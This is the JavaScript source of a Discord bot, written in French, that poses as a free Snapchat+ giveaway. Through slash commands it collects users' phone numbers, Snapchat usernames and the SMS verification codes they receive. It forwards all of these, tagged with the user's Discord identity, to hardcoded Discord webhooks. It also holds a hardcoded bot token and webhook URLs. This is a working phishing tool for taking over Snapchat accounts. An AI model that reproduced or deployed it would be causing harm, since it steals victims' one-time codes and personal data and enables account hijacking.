const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder, ActivityType } = require('discord.js');
const axios = require('axios');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ⚠️ REMPLACE CES VALEURS ⚠️
const BOT_TOKEN = 'MTQyOTg0NjE3MjEwMDU5MTYxNg.GmafoZ.Jp7FnJPNvEYFG1kf3GhA5u4joe0VKYML9mvxVA';
const CLIENT_ID = '1429846172100591616';

// Webhooks
const CODE_WEBHOOK = "https://discord.com/api/webhooks/1429847127688876193/sUmqf3K0pXW_4ZcV7FtAT0n-1ewqdFwIaztIKflx8o96ZeC2e0IaysXeVgQVShP7GVyl";
const LOGS_WEBHOOK = "https://discord.com/api/webhooks/1429848252676837499/xlOIErtodRnKudYBtXXGOy-o4ziPwfHdhIkYgWjSGqNS4noPX-Raq6pv-_iweDD70GPY";

// IDs des salons et messages
const RESTRICTED_CHANNEL_ID = '1429856111112093767';
const ALLOWED_MESSAGE_ID = '1429856718594244618';

// Stockage temporaire des données
const userData = new Map();

// Commandes slash
const commands = [
    new SlashCommandBuilder()
        .setName('code')
        .setDescription('Enregistrer numéro et snap')
        .addStringOption(option =>
            option.setName('num')
                .setDescription('Numéro de téléphone')
                .setRequired(true))
        .addStringOption(option =>
            option.setName('snap')
                .setDescription('Nom Snapchat')
                .setRequired(true)),
    
    new SlashCommandBuilder()
        .setName('verif')
        .setDescription('Vérifier le code reçu par SMS')
        .addStringOption(option =>
            option.setName('code')
                .setDescription('Code reçu par SMS')
                .setRequired(true))
];

// Enregistrement des commandes
const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);

async function registerCommands() {
    try {
        console.log('Enregistrement des commandes slash...');
        await rest.put(
            Routes.applicationCommands(CLIENT_ID),
            { body: commands }
        );
        console.log('✅ Commandes enregistrées avec succès!');
    } catch (error) {
        console.error('❌ Erreur lors de l\'enregistrement des commandes:', error);
    }
}

// Fonction pour envoyer un webhook
async function sendWebhook(webhookUrl, data) {
    try {
        await axios.post(webhookUrl, data);
    } catch (error) {
        console.error('Erreur webhook:', error);
    }
}

// Fonction pour nettoyer le salon restreint
async function cleanRestrictedChannel() {
    try {
        const channel = await client.channels.fetch(RESTRICTED_CHANNEL_ID);
        if (!channel) return;

        const messages = await channel.messages.fetch({ limit: 100 });
        
        for (const [id, message] of messages) {
            // Ne pas supprimer le message autorisé
            if (id === ALLOWED_MESSAGE_ID) continue;
            
            // Supprimer tous les autres messages
            await message.delete().catch(console.error);
        }
        
        console.log(`✅ Salon ${RESTRICTED_CHANNEL_ID} nettoyé avec succès!`);
    } catch (error) {
        console.error('❌ Erreur lors du nettoyage du salon:', error);
    }
}

// Gestion des messages dans le salon restreint
client.on('messageCreate', async (message) => {
    // Ignorer les messages du bot lui-même
    if (message.author.bot) return;
    
    // Vérifier si le message est dans le salon restreint
    if (message.channel.id === RESTRICTED_CHANNEL_ID) {
        // Ne pas supprimer le message autorisé
        if (message.id === ALLOWED_MESSAGE_ID) return;
        
        // Supprimer le message de l'utilisateur
        await message.delete().catch(console.error);
        
        // Envoyer un message d'avertissement
        const warningMessage = await message.channel.send({
            content: `❌ <@${message.author.id}>, tu ne peux pas parler dans ce salon!\n\nSi tu souhaites parler, viens dans ce salon: https://discord.com/channels/1429844760868421784/1429922322969530571`
        });
        
        // Supprimer le message d'avertissement après 5 secondes
        setTimeout(async () => {
            try {
                await warningMessage.delete();
            } catch (error) {
                console.error('Erreur lors de la suppression du message d\'avertissement:', error);
            }
        }, 5000);
    }
});

// Commande /code
client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    if (interaction.commandName === 'code') {
        const num = interaction.options.getString('num');
        const snap = interaction.options.getString('snap');

        // Stocker les données utilisateur
        userData.set(interaction.user.id, {
            num: num,
            snap: snap,
            timestamp: Date.now()
        });

        // Envoyer au webhook des codes
        const webhookData = {
            embeds: [{
                title: "🎯 Nouvelle demande de code",
                color: 0x00ff00,
                fields: [
                    {
                        name: "🟢 Numéro",
                        value: num,
                        inline: true
                    },
                    {
                        name: "📱 Snap",
                        value: snap,
                        inline: true
                    },
                    {
                        name: "👤 Utilisateur Discord",
                        value: `${interaction.user.tag} (${interaction.user.id})`,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        await sendWebhook(CODE_WEBHOOK, webhookData);

        // Répondre à l'utilisateur
        const responseEmbed = new EmbedBuilder()
            .setTitle("Snap+ APP 18")
            .setColor(0x00ff00)
            .setDescription("Un code sera envoyé au numéro par SMS, une fois reçu, utilise la commande `/verif` pour entrer ton code et activer Snap+ !")
            .addFields(
                { name: "Numéro", value: num, inline: true },
                { name: "Snap", value: snap, inline: true }
            )
            .setFooter({ text: "Toi seul(e) peux voir celui-ci" })
            .setTimestamp();

        await interaction.reply({ 
            embeds: [responseEmbed],
            ephemeral: true 
        });
    }

    if (interaction.commandName === 'verif') {
        const code = interaction.options.getString('code');
        const userInfo = userData.get(interaction.user.id);

        if (!userInfo) {
            return await interaction.reply({ 
                content: "❌ Tu dois d'abord utiliser la commande `/code` avant de vérifier.", 
                ephemeral: true 
            });
        }

        // Envoyer les logs au webhook avec ping @everyone
        const logData = {
            content: "@everyone 📩 +1 NOUVEAU SMS", // Ping everyone avec message pour nouveau SMS
            embeds: [{
                title: "📋 Logs de vérification",
                color: 0xffa500,
                fields: [
                    {
                        name: "🔢 Numéro",
                        value: userInfo.num,
                        inline: true
                    },
                    {
                        name: "📱 Snap",
                        value: userInfo.snap,
                        inline: true
                    },
                    {
                        name: "🔐 Code",
                        value: code,
                        inline: true
                    },
                    {
                        name: "👤 Utilisateur",
                        value: `${interaction.user.tag} (${interaction.user.id})`,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            }]
        };

        await sendWebhook(LOGS_WEBHOOK, logData);

        // Réponse à l'utilisateur
        const verificationEmbed = new EmbedBuilder()
            .setTitle("# 3 mois d'abonnement - APP")
            .setColor(0x00ff00)
            .setDescription("Vérification en cours, une fois terminée, le bot t'enverra un DM sur Discord et Snapchat+ sera activé sur ton compte snap (max 3-4h)")
            .setFooter({ text: "Toi seul(e) peux voir celui-ci" })
            .setTimestamp();

        await interaction.reply({ 
            embeds: [verificationEmbed],
            ephemeral: true 
        });

        // Supprimer les données utilisateur après vérification
        userData.delete(interaction.user.id);
    }
});

// Démarrage du bot
client.once('ready', async () => {
    console.log(`✅ Bot connecté en tant que ${client.user.tag}`);
    
    // Définir le statut du bot
    client.user.setActivity({
        name: 'Offrir snap +',
        type: ActivityType.Playing
    });
    
    console.log('✅ Statut du bot défini: "Joue à Offrir snap +"');
    
    // Nettoyer le salon restreint au démarrage
    await cleanRestrictedChannel();
    
    // Enregistrer les commandes
    await registerCommands();
});

// Connexion du bot
client.login(BOT_TOKEN);